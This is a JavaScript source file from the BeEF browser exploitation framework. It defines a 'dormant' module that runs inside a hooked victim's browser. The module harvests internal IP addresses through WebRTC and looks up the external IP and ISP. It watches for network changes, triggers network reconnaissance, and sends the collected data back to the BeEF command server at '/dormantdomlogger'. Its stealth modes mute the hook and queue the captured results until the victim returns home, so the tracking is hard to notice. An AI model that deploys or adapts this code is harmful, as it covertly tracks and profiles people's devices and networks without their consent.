//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// TODO: Why do I use localStorage in this? I mean, I just use JS memory :/
// Is the idea to recover from localStorage in particular circumstances?

function Beefaredormant(stealth, end_mode) {
    this.verbLogEnabled = true;
    this.saveLocal = false;
    this.onlineStatus = false;
    this.rtcIps = "";
    this.externalIp = "";
    this.isp = "";
    this.pollTimeout = 20000;
    this.netcount = 0;
    this.ts = null;
    // stealthLevel
    // 1 - not too stealthy, when we see a new network we will:
    //   - * immediately probe for external stuff
    //   - * immediately send data back to beef (or try)
    // 2 - sort of stealthy, when we see a new network we will:
    //   - * immediately probe for external stuff
    //   - * NOT send back to beef until we return to original network
    //   - * And the BeEF hook is disabled until we return
    // 3 - very stealthy, when we see a new network we will:
    //   - * NOT probe for external information
    //   - * NOT send back to beef until we return to original network
    //   - * And the BeeF hook is disabled until we return
    this.stealthLevel = stealth;

    // endMode
    // 0 - just run indefinitely - even after returning home
    // 1 - after returning home and dumping data - kill all timers (and humans)
    this.endMode = end_mode;

    // outer wrapping function on netrecon
    // this.prototype.outer_sequential = outer;

    //Fusejs.io - setting options
    this.fuseoptions = {
      include: ["score"],
      tokenize: true,
      matchAllTokens: true,
      threshold: 0.6,
      location: 0,
      distance: 100,
      maxPatternLength: 32,
      minMatchCharLength: 3,
      keys: [
        "title",
        "shorttitle"
      ]
    };

    //Fuse - first and full network lists
    this.fusefirst = [];
    this.fuseall = [];

    // globals
    this.agTimer = null;
    this.agOnlineIntervalTimer = null;

    this.setupPhase();
}

    
Beefaredormant.prototype.verbLog = function(msg) {
  if (this.verbLogEnabled === true) {
    var p = document.createElement("p");
    p.innerHTML = msg;
    document.body.insertBefore(p, document.body.firstChild);
    console.log(msg);
  }
}

Beefaredormant.prototype.dumpToBeef = function() {
  // Because fuseall includes *all* the state info, lets dump it
  // to the beef handler
  this.fuseall.forEach(function(network) {
    var msg = "Time: '" + network.ts + "' | ";
    msg = msg + "RTC: '" + network.rtc + "' | ";
    msg = msg + "External: '" + network.ip + "' | ";
    msg = msg + "ISP: '" + network.shorttitle + " - " + network.title + "'";
    beef.net.send('/dormantdomlogger',0,{message: msg});
  });

}

Beefaredormant.prototype.printStatus = function(sendtobeef) {
  var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;

  this.verbLog("Online Status: '" + this.onlineStatus + "'");
  this.verbLog("RTC IPs: '" + this.rtcIps+ "'");
  this.verbLog("External IP: '" + this.externalIp + "'");
  this.verbLog("ISP: '" + this.isp + "'");

  if (sendtobeef == true) {
    var msg = "Online: '" + this.onlineStatus + "' | ";
    msg = msg + "RTC: '" + this.rtcIps + "' | ";
    msg = msg + "External: '" + this.externalIp + "' | ";
    msg = msg + "ISP: '" + this.isp + "'";
    beef.net.send('/dormantdomlogger',0,{message: msg});
  }
}

Beefaredormant.prototype.getOnlineState = function() {
  // https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine
  return window.navigator.onLine;
}

// This is yanked from the WebRTC IP Module
Beefaredormant.prototype.getRtcIp = function(success, failure) {
  var RTCPeerConnection = false;
  if (window.webkitRTCPeerConnection) {
    RTCPeerConnection = window.webkitRTCPeerConnection;
  } else if (window.mozRTCPeerConnection) {
    RTCPeerConnection = window.mozRTCPeerConnection;
  }

  if (RTCPeerConnection){

      var addrs = Object.create(null);
      addrs["0.0.0.0"] = false;

      // Construct RTC peer connection
      var servers = {iceServers:[]};
      var mediaConstraints = {optional:[{googIPv6: true}]};
      var rtc = new RTCPeerConnection(servers, mediaConstraints);
      rtc.createDataChannel('', {reliable:false});

      // Upon an ICE candidate being found
      // Grep the SDP data for IP address data
      rtc.onicecandidate = function (evt) {
        if (evt.candidate){
          grepSDP("a="+evt.candidate.candidate);
        }
      };

      // Create an SDP offer
      rtc.createOffer(function (offerDesc) {
          grepSDP(offerDesc.sdp);
          rtc.setLocalDescription(offerDesc);
      }, function (e) {
        // failed SDP offer - do nothing
        failure("failed SDP offer");
      });

      // Return results
      function processIPs(newAddr) {
          // check here for only ipv4 // HACK
          if (newAddr.length > 15) {
              return;
          }
          if (newAddr in addrs) return;
          else addrs[newAddr] = true;
          var displayAddrs = Object.keys(addrs).filter(function (k) {
              return addrs[k];
          });
          success(displayAddrs.join(","));
      }


      // Retrieve IP addresses from SDP 
      function grepSDP(sdp) {
          var hosts = [];
          // c.f. http://tools.ietf.org/html/rfc4566#page-39
          sdp.split('\r\n').forEach(function (line) {
              // http://tools.ietf.org/html/rfc4566#section-5.13
              if (~line.indexOf("a=candidate")) {
                  // http://tools.ietf.org/html/rfc5245#section-15.1
                  var parts = line.split(' '),
                      addr = parts[4],
                      type = parts[7];
                  if (type === 'host') processIPs(addr);
                         // http://tools.ietf.org/html/rfc4566#section-5.7
              } else if (~line.indexOf("c=")) {
                  var parts = line.split(' '),
                      addr = parts[2];
                  processIPs(addr);
              }
          });
      }
  }else {
    failure("Doesnt support RTC");
  }

} // end of getRtcIp

// This function reaches out to <site> to get info
// TODO: This should have 'failure' async method handling too
Beefaredormant.prototype.getExternalDetails = function(completion) {
  var xhttp3 = new XMLHttpRequest();
  xhttp3.onreadystatechange = function() {
      if (xhttp3.readyState == 4 && xhttp3.status == 200) {
          completion(xhttp3.responseText);
      }
  };
  // xhttp3.open("GET", "http://ip-api.com/json?rnd="+Date.now(), true);
  // xhttp3.open("GET", "http://ip-api.com/json", true);
  xhttp3.open("GET",beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/aslookup", true);
  xhttp3.send(); 
}

// Check if we can use localStorage
Beefaredormant.prototype.storageAvailable = function(type) {
  try {
    var storage = window[type], x = '__storage_test__';
      storage.setItem(x, x);
      storage.removeItem(x);
      return true;
    }
    catch(e) {
      return false;
    }
}

// Save state .. into localStorage if available
// TODO: This should maybe save a json/data struct into some B64 encoded blob?
Beefaredormant.prototype.saveState = function(saveLocal, id, online, rtc, ip, isp) {
  if (saveLocal == true) {
    localStorage.setItem('rtc_'+id, rtc);
    this.onlineStatus = online;
    localStorage.setItem('ip_'+id, ip);
    localStorage.setItem('isp_'+id, isp);
    localStorage.setItem('ts_'+id, Date.now());
  } // else ? what then?

  //lets build up our fuse lists
  var astitle = isp;
  var asshort = "";
  if (isp.indexOf(" - ") !== -1) {
    // we have a split
    astitle = isp.split(/ - (.+)/)[1]
    asshort = isp.split(" - ")[0]
  }

  var asn = {title: astitle, shorttitle: asshort, id: id, rtc: rtc, ip: ip, ts: Date.now()};
  this.fuseall.push(asn); // we'll keep on building these up

  if (id === 0) {
    // this is the first - lets setup the first fuse
    asn = {title: astitle, shorttitle: asshort};
    this.fusefirst.push(asn); // this is the only time we do this
  }

}

// This tries to figure out where we are
// In all instances, at the end, it should re-kick off the timers
Beefaredormant.prototype.presenceCheck = function() {
  // how long have I been away for?
  var prevStamp = this.ts;
  this.verbLog("prev: " + Math.round(prevStamp/1000));
  this.verbLog("Now: " + Math.round(Date.now()/1000));

  if ((Math.round(prevStamp/1000)+60) < (Math.round(Date.now()/1000))) {
    // it's been longer than a minute!
    this.verbLog("It's been longer than a minute - what's happened?");
  
    this.startTimers();
  } else {
    // it's been less than a minute
    this.verbLog("It's been less than a minute - what's happened?");
    // do we want to double-check RTC? For instance, if we've gone from
    // GSM to WiFi?

    // check changes to online status
    var freshOnlineStatus = this.getOnlineState();
    if ((freshOnlineStatus.toString().toUpperCase()) === 
            this.onlineStatus.toString().toUpperCase()) {
      // we havent' changed status - apparently?
      this.verbLog("we haven't changed online status");

      this.startTimers();
    } else {
      // we are now in a different online state.
      this.verbLog("we are now in a different state. freshOnlineStatus:");
      this.verbLog("'" + freshOnlineStatus.toString() + "'");

      if ((freshOnlineStatus.toString().toUpperCase()) === "FALSE") {
        // we are now offline from being online
        this.verbLog("we are now offline ... ");
        this.onlineStatus = freshOnlineStatus;

        this.startTimers();
      } else {
        // we are now online from offline
        // this is where things get interesting - i.e. are we on a different network?
        this.verbLog("we are back online!..");
        this.verbLog("do checks here..");

        this.getRtcIp(function(e) {
          if (this.checkLastRtc(e)) {
            // Our internal IP is EXACTLY the same
            // @BUG - RTC doesn't seem to poll back properly??

            this.getExternalDetails(function(b) {
              if (this.checkLastIsp(JSON.parse(b).asn)) {
                // rtc and isp hasn't changed
                this.verbLog("rtc and ISP hasn't changed since last");
                this.verbLog("Compared " + e + " to " + localStorage.getItem('rtc_'+this.netcount));
                this.verbLog("Compared " + JSON.parse(b).asn + " to " + localStorage.getItem('isp_'+this.netcount));
                this.onlineStatus = freshOnlineStatus;

                this.startTimers();
              } else {
                // rtc is the same, ISP has changed - this is that BUG!
                // Or is it? Do we need to do a fuzzy match?
                this.verbLog("rtc is the same, but we've changed ISP");
                this.verbLog("This is some bug in detecting repeat RTC internal IPs");
                this.verbLog("Compared " + e + " to " + localStorage.getItem('rtc_'+this.netcount));
                this.verbLog("Compared " + JSON.parse(b).asn + " to " + localStorage.getItem('isp_'+this.netcount));
                this.onlineStatus = freshOnlineStatus;

                if (this.checkInitialRtcOrIsp(e, JSON.parse(b).asn)) {
                  this.verbLog("We are back home now .. ?");
                  this.backHome(e,b);
                } else {
                  this.verbLog("We are now on a different ISP");
                  this.netRecon(e,b);
                }
              }
            }.bind(this));



          } else { //checkLastRTC
            // Our internal IP is different (even slightly)
            // check how different the IP is
            this.verbLog("We were: " + localStorage.getItem('rtc_'+this.netcount));
            this.verbLog("We are now: " + e);
            this.onlineStatus = freshOnlineStatus;

            this.getExternalDetails(function(b) {
              if (this.checkInitialRtcOrIsp(e, JSON.parse(b).asn)) {
                this.verbLog("We are back home now...");
                this.backHome(e,b);
              } else {
                this.verbLog("We are definitely not home..");
                this.netRecon(e,b);
              }
            }.bind(this));

            // @BUG - commented all this because of the stupid RTC issue
            // // check if we are back home (i.e. first network)
            // if (this.checkInitialRtc(e)) {
            //   this.verbLog("We are back home now...");
            //
            //   // do we have any cached responses to send?
            //   //
            //   // restart the beef hook
            //   //
            //   // restart the timers
            // } else {
            //   // save a new network location object
            //   // kick off scan
            //   // store results
            //   this.netRecon(e);
            // }
            
          }

        }.bind(this), function(e) {
          //rut roh - couldn't get RtcIp?
          this.verbLog("How?");
        }.bind(this));
      }
    }
  }
} // end of presenceCheck()

Beefaredormant.prototype.backHome = function(rtcresult, externalDetails) {

  this.netcount++;
  this.externalIp = JSON.parse(externalDetails).isp;
  this.isp = JSON.parse(externalDetails).asn;

  this.saveState(this.saveLocal, this.netcount, this.onlineStatus, rtcresult, this.externalIp, this.isp);

  if (this.stealthLevel > 1) {
    // we are back home
    // send all cached module responses
    beef.aredormanthelpers.flush();

    beef.updater.lock = false; // Allow beef to talk again

    this.dumpToBeef(); // Dump *all* of the network info back
  }

  if (this.endMode === 0) {
    // kick off timer again
    this.startTimers();
  }
}

// checkInitialRtcOrIsp checks the new IP address against the first RTC Ip
// i.e. are we back home?
// TODO: THIS NEEDS TO USE FUZZY MATCHING
Beefaredormant.prototype.checkInitialRtcOrIsp = function(ip, isp) {
  this.verbLog("Checking initial IP or ISP...");
  var result = false;
  if (this.saveLocal === true) {
    if (ip.toUpperCase() === localStorage.getItem('rtc_0').toUpperCase()) {
      this.verbLog("ip is exactly the same");
      result = true;
    } else {
      var matchedIp = "";
      var brokenew = ip.split(".");
      var brokeold = localStorage.getItem('rtc_0').split(".");

      for (var i = 0; i < 4; i++) {
        if (i > 0) {
          matchedIp = matchedIp + ".";
        }
        if (brokenew[i] === brokeold[i]) {
          matchedIp = matchedIp + brokenew[i];
        } else {
          matchedIp = matchedIp + "xxx";
        }
      }

      this.verbLog("ip matching hitrate: " + matchedIp);
    }

    if (isp.toUpperCase() === localStorage.getItem('isp_0').toUpperCase()) {
      this.verbLog("ISP is exactly the same");
      result = true;
    }

    //debug only


    if (result === false) {
      this.verbLog("Neither IP or ISP are exactly the same - fuzzy matching..");
      
      // time for fuzzy matching?

      // first lets only allow particular characters
      var shortisp = isp.replace(/[^a-zA-Z0-9-_]/,'');
      // shorten
      // by removing words less than 1-3 characters long
      shortisp = shortisp.replace(/\W*\b\w{1,2}\b/g,"");
      shortisp = shortisp.substring(0,32);
      var fuse = new Fuse(this.fusefirst, this.fuseoptions);
      var fuseresult = fuse.search(shortisp);

      if (fuseresult.length > 0) {
        this.verbLog("Fuzzy match HIT");
        // we have a fuzzy match
        // do we care *how* much of a match?
        result = true;
      }
    }
  }

  return result;
}

// checkLastIsp checks the new isp attributes against the last
// not ALL of the previous IPs.
// The removed comments were for a fuzzy matching logic in ruby - I'm an idiot and forgot this was JS (It was late and I was drinking fuck you)
// The trick appears to be - fuzzy matching - with at least one word .. but remove small words

Beefaredormant.prototype.checkLastIsp = function(isp) {
  var result = false;
  if (this.saveLocal === true) {
    if (isp.toUpperCase() === localStorage.getItem('isp_'+this.netcount).toUpperCase()) {
      result = true;
    }
  }

  return result;
}

// checkLastRtc checks the new IP address against the last IP
// not ALL of the previous IPs.
// TODO: This doesn't do *any* smart sub-class matching. Just direct IP matching
Beefaredormant.prototype.checkLastRtc = function(ip) {
  var result = false;
  if (this.saveLocal === true) {
    // for (var c = 0; c <= this.netcount; c++) {
    //   if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
    //     result = true;
    //   }
    // }
    if (ip.toUpperCase().toUpperCase() === localStorage.getItem('rtc_'+this.netcount).toUpperCase()) {
      result = true;
    }
  }

  return result;
}

Beefaredormant.prototype.checkOnlineState = function() {
  var newState = this.getOnlineState();
  if (this.onlineStatus !== newState) {
    clearInterval(this.agOnlineIntervalTimer); // clear the interval 
    clearTimeout(this.agTimer); // clear the timeout

    this.verbLog("online status changed!");

    this.presenceCheck();
  }
}

Beefaredormant.prototype.startTimers = function() {
  this.ts = Date.now();
  this.agTimer = setTimeout(function() {this.presenceCheck()}.bind(this), this.pollTimeout);
  clearInterval(this.agOnlineIntervalTimer);
  this.agOnlineIntervalTimer = setInterval(function() {this.checkOnlineState()}.bind(this),200);
}

Beefaredormant.prototype.netRecon = function(rtcresult, externalDetails) {
  this.verbLog("PERFORM NETWORK RECON HERE!");
  // this.getExternalDetails(function(e) {
    this.externalIp = JSON.parse(externalDetails).ip;
    this.rtcIps = rtcresult;
    this.isp = JSON.parse(externalDetails).asn;

    this.netcount++;

    if (this.stealthLevel === 1) {
      this.printStatus(true);
    } else {
      this.printStatus(false);
    }

    this.saveState(this.saveLocal, this.netcount, this.onlineStatus, rtcresult, this.externalIp, this.isp);

    //var s=rtcIps.split('.');
    //var start = s[0]+'.'+s[1]+'.'+s[2]+'.65';
    //var end = s[0]+'.'+s[1]+'.'+s[2]+'.70';
    //var mod_input = start+'-'+end;

    //ping_sweep(mod_input,4,get_http_servers);
    outer_sequential_mod_output = this.rtcIps;
    this.outer_sequential(this.stealthLevel);


    // restart timer
    this.startTimers();
  // }.bind(this));
} // end of netRecon()

Beefaredormant.prototype.setupPhase = function() {
  this.verbLog("Starting setupPhase");
  this.verbLog("Stealth is: " + this.stealthLevel);
  //redundant as we know?
  if (this.storageAvailable('localStorage') == true) {
    this.saveLocal = true;
    // clear the current localStorage?
    localStorage.clear();
  }

  this.onlineStatus = this.getOnlineState();

  this.getRtcIp(function(e) {
    this.rtcIps = e;
    this.getExternalDetails(function(e) {
      this.externalIp = JSON.parse(e).ip;
      this.isp = JSON.parse(e).asn;

      this.printStatus(true);

      this.saveState(this.saveLocal, this.netcount, this.onlineStatus, this.rtcIps, this.externalIp, this.isp);

      if (this.stealthLevel > 1) {
        // turn off beef polling
        beef.updater.lock = true;
      }
      this.startTimers();

    }.bind(this));
  }.bind(this), function(e) {
    //console.log("failure " + e);
  });
} // end of setupPhase()

// This is the end of the Beefaredormant Class - we have a few helpers that we're adding into the global BeEF object below

beef.aredormanthelpers = {
  cmd_queue: [],

  queue: function(handler, cid, results, exec_status, callback) {
    if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
      var s = new beef.net.command();
      s.cid = cid;
      s.results = beef.net.clean(results);
      s.status = exec_status;
      s.callback = callback;
      s.handler = handler;
      this.cmd_queue.push(s);
    }
  },

  flush: function() {
    if (this.cmd_queue.length > 0) {
      for (var i = 0; i < this.cmd_queue.length; i++) {
        console.log("Pushing ARE Dormant command to beef.net.send queue");
        beef.net.send(this.cmd_queue[i].handler, this.cmd_queue[i].cid, this.cmd_queue[i].results, this.cmd_queue[i].status, this.cmd_queue[i].callback);
      }

    }

    this.cmd_queue.length = 0;
  }
}

beef.regCmp('beef.aredormanthelpers');
